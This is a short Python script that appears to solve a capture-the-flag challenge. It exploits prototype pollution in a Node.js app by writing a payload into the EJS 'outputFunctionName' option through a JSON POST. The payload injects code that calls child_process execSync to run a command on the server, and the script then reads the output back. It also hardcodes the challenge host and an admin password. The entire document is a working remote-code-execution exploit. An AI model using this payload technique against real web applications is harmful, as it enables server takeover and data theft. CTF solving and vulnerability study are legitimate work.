import requests

# URL = "http://localhost:1337/"
# PASSWORD = "admin"
URL = "http://illusion.pwn2win.party:45719/"
PASSWORD = "xsrygxwvhfvoxqet"

# pollute the ejs outputFunctionName option
res = requests.post(URL + "change_status", auth=("admin", PASSWORD), json={"constructor/prototype/outputFunctionName": "a; return process.mainModule.require('child_process').execSync('/readflag').toString(); //"})

# retrieve flag
res = requests.get(URL, auth=("admin", PASSWORD))
print(res.text)

